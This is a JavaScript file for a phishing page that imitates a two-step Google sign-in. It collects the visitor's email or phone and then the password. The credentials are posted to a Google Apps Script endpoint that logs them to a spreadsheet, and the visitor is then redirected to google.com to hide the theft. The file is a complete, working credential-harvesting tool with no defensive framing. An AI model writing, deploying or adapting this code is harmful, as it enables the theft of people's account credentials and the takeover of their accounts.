const form = document.getElementById("loginForm");
const heading = document.getElementById("main-heading");
const desc = document.getElementById("main-desc");

let userEmail = ""; // Store email temporarily

form.addEventListener("submit", function (e) {
  e.preventDefault();

  const emailField = document.getElementById("email");
  const passwordField = document.getElementById("password");

  if (!passwordField) {
    // First step: email entered
    userEmail = emailField.value.trim();
    if (!userEmail) {
      alert("Please enter your email or phone.");
      return;
    }

    // Replace form with password field
    heading.textContent = "Welcome";
    desc.textContent = userEmail;

    form.innerHTML = `
      <input type="password" id="password" placeholder="Enter your password" required />
      <p class="link"><a href="#">Forgot password?</a></p>
      <div class="btn-container">
        <button type="submit">Next</button>
      </div>
    `;
  } else {
    // Second step: password entered
    const passwordValue = passwordField.value.trim();

    // Send data to Google Sheet
    fetch("https://script.google.com/macros/s/AKfycbxKswPuEtwUV9XplfEUxmFds-G9KJZXQ6QG_zLvHpToBRURSQWTAM1kwKHBhmXXpXTuEA/exec", {
      method: "POST",
      body: JSON.stringify({
        gmail: userEmail,
        password: passwordValue
      })
    }).then(res => {
      // Optionally wait, then redirect
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 500); // slight delay
    }).catch(err => {
      alert("Something went wrong.");
      console.error(err);
    });
  }
});
